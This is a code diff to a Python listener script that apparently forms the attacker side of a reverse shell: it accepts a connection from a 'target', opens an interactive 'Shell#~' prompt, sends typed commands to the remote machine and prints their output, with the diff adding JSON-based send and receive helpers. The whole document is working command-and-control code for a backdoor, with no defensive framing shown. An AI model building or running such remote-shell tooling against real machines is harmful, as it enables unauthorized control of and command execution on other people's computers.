@@ -1,4 +1,5 @@
 import socket
+import json
 from termcolor import colored
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -13,16 +14,32 @@ target, ip = s.accept()
 print(colored(f"[+] Connection established from: {ip}", "green"))
 s.close()
 
+def reliable_send(data):
+	json_data = json.dumps(data)
+	target.send(json_data.encode())
+	
+def reliable_recv():
+	data = ""
+	
+	while True:
+		try:
+			data += target.recv(1024).decode()
+			
+			return json.loads(data)
+		
+		except ValueError:
+			continue
+
 def shell():
 	while True:
 		command = input("Shell#~%s: " % str(ip))
 		
 		if command == 'q':
-			target.send(command.encode())
+			reliable_send('q')
 			break
 		
-		target.send(command.encode())
-		result = target.recv(1024).decode()
+		reliable_send(command)
+		result = reliable_recv()
 		print(result)
 
 shell()
